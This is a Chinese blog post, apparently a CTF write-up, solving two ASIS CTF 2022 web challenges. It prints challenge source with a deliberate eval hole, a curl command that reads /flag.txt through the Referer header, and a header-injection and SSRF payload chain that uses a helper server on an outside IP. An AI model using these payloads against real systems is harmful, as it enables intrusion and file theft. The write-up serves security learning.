@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="images/favicon.ico">
+  <title>2022asisctf-web部分wp | fmyyy</title>
+  <meta name="author" content="fmyyy" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="前言简单看了一下，一看就是几小时。。。 Beginner ducks源码 1234567891011121314151617181920212223242526272829303132333435#!&#x2F;usr&#x2F;bin&#x2F;env python3from flask import Flask,request,Responseimport randomimport reapp &#x3D; Flask(__name">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022asisctf-web部分wp">
+<meta property="og:url" content="https://fmyyy.gitee.io/2022/10/16/2022asisctf_web%E9%83%A8%E5%88%86wp/index.html">
+<meta property="og:site_name" content="fmyyy">
+<meta property="og:description" content="前言简单看了一下，一看就是几小时。。。 Beginner ducks源码 1234567891011121314151617181920212223242526272829303132333435#!&#x2F;usr&#x2F;bin&#x2F;env python3from flask import Flask,request,Responseimport randomimport reapp &#x3D; Flask(__name">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta property="article:published_time" content="2022-10-15T16:14:04.000Z">
+<meta property="article:modified_time" content="2022-10-15T16:42:43.441Z">
+<meta property="article:author" content="fmyyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/hf1.jpg');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>归档</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>Friends</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/fmyyy1">CSDN</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>联系</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a href="/null">QQ:254005846</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">fmyyy</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>fmyyy</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">2022asisctf-web部分wp</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2022-10-16</li>
+                <li><i class="fa fa-user"></i> 作者 fmyyy</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~6.55K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1665852163441"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Beginner-ducks"><span class="toc-number">2.</span> <span class="toc-text">Beginner ducks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Firewalled"><span class="toc-number">3.</span> <span class="toc-text">Firewalled</span></a></li></ol>
+                </div>
+            
+            <hr />
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>简单看了一下，一看就是几小时。。。</p>
+<h2 id="Beginner-ducks"><a href="#Beginner-ducks" class="headerlink" title="Beginner ducks"></a>Beginner ducks</h2><p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,Response</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">availableDucks = [<span class="string">&#x27;duckInABag&#x27;</span>,<span class="string">&#x27;duckLookingAtAHacker&#x27;</span>,<span class="string">&#x27;duckWithAFreeHugsSign&#x27;</span>]</span><br><span class="line">indexTemplate = <span class="literal">None</span></span><br><span class="line">flag = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/duck&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">retDuck</span>():</span></span><br><span class="line">	what = request.args.get(<span class="string">&#x27;what&#x27;</span>)</span><br><span class="line">	duckInABag = <span class="string">&#x27;./images/e146727ce27b9ed172e70d85b2da4736.jpeg&#x27;</span></span><br><span class="line">	duckLookingAtAHacker = <span class="string">&#x27;./images/591233537c16718427dc3c23429de172.jpeg&#x27;</span></span><br><span class="line">	duckWithAFreeHugsSign = <span class="string">&#x27;./images/25058ec9ffd96a8bcd4fcb28ef4ca72b.jpeg&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">not</span> what <span class="keyword">or</span> re.search(<span class="string">r&#x27;[^A-Za-z\.]&#x27;</span>,what)):</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;what?&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="built_in">eval</span>(what),<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		<span class="keyword">return</span> Response(f.read(), mimetype=<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">	<span class="keyword">return</span> indexTemplate.replace(<span class="string">&#x27;WHAT&#x27;</span>,random.choice(availableDucks))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./index.html&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	indexTemplate = f.read() </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__ == <span class="string">&#x27;__main__&#x27;</span>):</span><br><span class="line">	app.run(port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>duck路由eval了what，并且以文件形式打开，flag在/flag.txt     what只允许字母和.</p>
+<p>这样就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://ducks.asisctf.com:8000/duck?what=request.referrer&#x27; -H &quot;Referer: /flag.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Firewalled"><a href="#Firewalled" class="headerlink" title="Firewalled"></a>Firewalled</h2><p>附件格式</p>
+<p><img src="https://img.le1a.com/2022/10/16/f562ed042d7ec.png" alt="1665851331286.png"></p>
+<p>看yml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;3.9&quot;</span><br><span class="line">   </span><br><span class="line">services:</span><br><span class="line">  flag-container:</span><br><span class="line">    build: ./flag-container</span><br><span class="line">    environment:</span><br><span class="line">      - FLAG=ASIS&#123;test-flag&#125;</span><br><span class="line">    restart: always</span><br><span class="line">  firewalled-curl:</span><br><span class="line">    build: ./firewalled-curl</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;8000:80&quot;</span><br><span class="line">    restart: always</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>很明了</p>
+<p>firewalled-curl可以发送http请求，但是有几个过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">isSafeAscii = lambda s : not re.search(r&#x27;[^\x20-\x7F]&#x27;,s)</span><br><span class="line">isSafeHeader = lambda s : isSafeAscii(s)</span><br><span class="line">isSafePath = lambda s : s[0] == &#x27;/&#x27; and isSafeAscii(s) and &#x27; &#x27; not in s</span><br><span class="line">badHeaderNames = [&#x27;encoding&#x27;,&#x27;type&#x27;,&#x27;charset&#x27;]</span><br><span class="line">unsafeKeywords = [&quot;flag&quot;]</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">def isJson(s):</span><br><span class="line">	try:</span><br><span class="line">	    json.loads(s)</span><br><span class="line">	    return True</span><br><span class="line">	except:</span><br><span class="line">		return False</span><br><span class="line"></span><br><span class="line">def checkHostname(name):</span><br><span class="line">	name = str(name)</span><br><span class="line">	port = &#x27;80&#x27;</span><br><span class="line">	if(&#x27;:&#x27; in name):</span><br><span class="line">		sp = name.split(&#x27;:&#x27;)</span><br><span class="line">		name = sp[0]</span><br><span class="line">		port = sp[1]</span><br><span class="line"></span><br><span class="line">	if(</span><br><span class="line">		(</span><br><span class="line">		re.search(r&#x27;^[a-z0-9][a-z0-9\-\.]+$&#x27;,name) or</span><br><span class="line">		re.search(r&#x27;^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$&#x27;,name)</span><br><span class="line">		) and</span><br><span class="line">		0 &lt; int(port) &lt; 0x10000</span><br><span class="line">	):</span><br><span class="line">		return name,int(port)</span><br><span class="line">	return Exception(&#x27;unsafe port&#x27;),Exception(&#x27;unsafe hostname&#x27;)</span><br><span class="line"></span><br><span class="line">def recvuntil(sock,u):</span><br><span class="line">	r = b&#x27;&#x27;</span><br><span class="line">	while(r[-len(u):] != u):</span><br><span class="line">		r += sock.recv(1)</span><br><span class="line">	return r</span><br><span class="line"></span><br><span class="line">def checkHeaders(headers):</span><br><span class="line">	newHeaders = &#123;&#125;</span><br><span class="line">	if(type(headers) is not dict):</span><br><span class="line">		return Exception(&#x27;unsafe headers&#x27;) </span><br><span class="line">	for headerName in headers:</span><br><span class="line">		headerValue = str(headers[headerName])</span><br><span class="line">		if((isSafeHeader(headerName) and &#x27;:&#x27; not in headerName) and isSafeHeader(headerValue)):</span><br><span class="line">			isBad = False</span><br><span class="line">			for badHeaderName in badHeaderNames:</span><br><span class="line">				if(badHeaderName in headerName.lower()):</span><br><span class="line">					isBad = True</span><br><span class="line">					break</span><br><span class="line">			for badHeaderValue in unsafeKeywords:</span><br><span class="line">				if(badHeaderValue in headerValue.lower()):</span><br><span class="line">					isBad = True</span><br><span class="line">					break</span><br><span class="line">			if(isBad):</span><br><span class="line">				return Exception(&#x27;bad headers&#x27;)</span><br><span class="line">			newHeaders[headerName] = headerValue</span><br><span class="line">	return newHeaders</span><br><span class="line"></span><br><span class="line">def checkMethod(method):</span><br><span class="line">	if(method in [&#x27;GET&#x27;,&#x27;POST&#x27;]):</span><br><span class="line">		return method</span><br><span class="line">	return Exception(&#x27;unsafe method&#x27;)</span><br><span class="line"></span><br><span class="line">def checkPath(path):</span><br><span class="line">	if(isSafePath(path)):</span><br><span class="line">		return path</span><br><span class="line">	return Exception(&#x27;unsafe path&#x27;)</span><br><span class="line"></span><br><span class="line">def checkJson(j):</span><br><span class="line">	if(type(j) == str):</span><br><span class="line">		for u in unsafeKeywords:</span><br><span class="line">			if(u in j.lower()):</span><br><span class="line">				return False</span><br><span class="line">	elif(type(j) == list):</span><br><span class="line">		for entry in j:</span><br><span class="line">			if(not checkJson(entry)):</span><br><span class="line">				return False </span><br><span class="line">	elif(type(j) == dict):</span><br><span class="line">		for entry in j:</span><br><span class="line">			if(not checkJson(j[entry])):</span><br><span class="line">				return False </span><br><span class="line">	else:</span><br><span class="line">		return True</span><br><span class="line"></span><br><span class="line">	return True</span><br></pre></td></tr></table></figure>
+
+<p>再看flag容器</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">application = app</span><br><span class="line"><span class="comment"># flag = os.environ.get(&#x27;FLAG&#x27;)</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;test_flag&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">	args = request.args.get(<span class="string">&#x27;args&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		r = requests.post(<span class="string">&#x27;http://firewalled-curl/req&#x27;</span>,json=json.loads(args)).json()</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">&#x27;request&#x27;</span> <span class="keyword">in</span> r <span class="keyword">and</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r[<span class="string">&#x27;request&#x27;</span>] <span class="keyword">and</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> request.headers[<span class="string">&#x27;X-Request&#x27;</span>]):</span><br><span class="line">			<span class="keyword">return</span> flag</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;No flag for you :(&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__ == <span class="string">&#x27;__main__&#x27;</span>):</span><br><span class="line">	app.run(port=<span class="number">8019</span>)</span><br></pre></td></tr></table></figure>
+
+<p>构造这样的数据就能发包</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;host&quot;</span>:<span class="string">&quot;flag-container&quot;</span>,<span class="attr">&quot;headers&quot;</span>:&#123;<span class="attr">&quot;X-Request&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;,<span class="attr">&quot;method&quot;</span>:<span class="string">&quot;GET&quot;</span>,<span class="attr">&quot;path&quot;</span>:<span class="string">&quot;/flag?args=&#123;\&quot;host\&quot;:\&quot;124.70.40.5:18881\&quot;,\&quot;headers\&quot;:&#123;\&quot;X-Request\&quot;:\&quot;xxx\&quot;&#125;,\&quot;method\&quot;:\&quot;GET\&quot;,\&quot;path\&quot;:\&quot;/test\&quot;,\&quot;returnJson\&quot;:0&#125;&quot;</span>,<span class="attr">&quot;returnJson&quot;</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>args的内容又被发送到<code>http://firewalled-curl/req</code>, 然后r保存返回值</p>
+<p>主要是要满足</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;request&#x27; in r and &#x27;flag&#x27; in r[&#x27;request&#x27;] and &#x27;flag&#x27; in request.headers[&#x27;X-Request&#x27;])</span><br></pre></td></tr></table></figure>
+
+<p>checkJson的话 起一个http服务发送特定的json数据就能绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">application = app</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;request&quot;</span>:&#123;<span class="string">&quot;flag&quot;</span>:<span class="string">&quot;111&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__name__ == <span class="string">&#x27;__main__&#x27;</span>):</span><br><span class="line">    app.run(port=<span class="number">18881</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这样满足了前面两个，主要是最后<code>&#39;flag&#39; in request.headers[&#39;X-Request&#39;]</code></p>
+<p>因为checkHeaders的过滤，headers的value不能有flag，卡在这里了</p>
+<p>最后绕过的话用http格式的规范</p>
+<p>看到firewalled-curl里</p>
+<p><img src="https://img.le1a.com/2022/10/16/e21f886f1b34e.png" alt="1665851847879.png"></p>
+<p>他发送http头实际上是字符串拼接的，这里就能做文章</p>
+<p>比如</p>
+<p><img src="https://img.le1a.com/2022/10/16/3a052db606028.png" alt="1665851902838.png"></p>
+<p>我如果在请求头键值前加一个空格，他就会变成值，</p>
+<p><img src="https://img.le1a.com/2022/10/16/b3c5bfeda6dd2.png" alt="1665851962236.png"></p>
+<p>上面说他发送http数据是单纯凭借起来的头，所以我们只要</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;headers&quot;</span>:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;X-Request&quot;</span>:<span class="string">&quot;123&quot;</span>,</span><br><span class="line">  <span class="attr">&quot; flag&quot;</span>:  <span class="string">&quot;321&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>X-Request的值就会变为</p>
+<p><img src="https://img.le1a.com/2022/10/16/1426bc2e1510a.png" alt="1665852034105.png"></p>
+<p>满足条件了</p>
+<p>最后payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;host&quot;:&quot;flag-container&quot;,&quot;headers&quot;:&#123;&quot;X-Request&quot;:&quot;123&quot;,</span><br><span class="line">  &quot; flag&quot;:  &quot;321&quot;</span><br><span class="line">&#125;,&quot;method&quot;:&quot;GET&quot;,&quot;path&quot;:&quot;/flag?args=&#123;\&quot;host\&quot;:\&quot;124.70.40.5:18881\&quot;,\&quot;headers\&quot;:&#123;\&quot;X-Request\&quot;:\&quot;xxx\&quot;&#125;,\&quot;method\&quot;:\&quot;GET\&quot;,\&quot;path\&quot;:\&quot;/test\&quot;,\&quot;returnJson\&quot;:0&#125;&quot;,&quot;returnJson&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.le1a.com/2022/10/16/bc9f1e33bedd7.png" alt="1665852113724.png"></p>
+
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://fmyyy.gitee.io/2022/10/16/2022asisctf_web%E9%83%A8%E5%88%86wp/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://fmyyy.gitee.io/2022/10/16/2022asisctf_web%E9%83%A8%E5%88%86wp/";
+            const title         = "「2022asisctf-web部分wp」";
+            const excerpt       = `前言简单看了一下，一看就是几小时。。。
+Beginner ducks源码
+1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env pyth...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2022-10-16</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" 2022TCTFhessian-onlyJdk" href="/2022/10/14/2022TCTFhessian-onlyJdk/">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
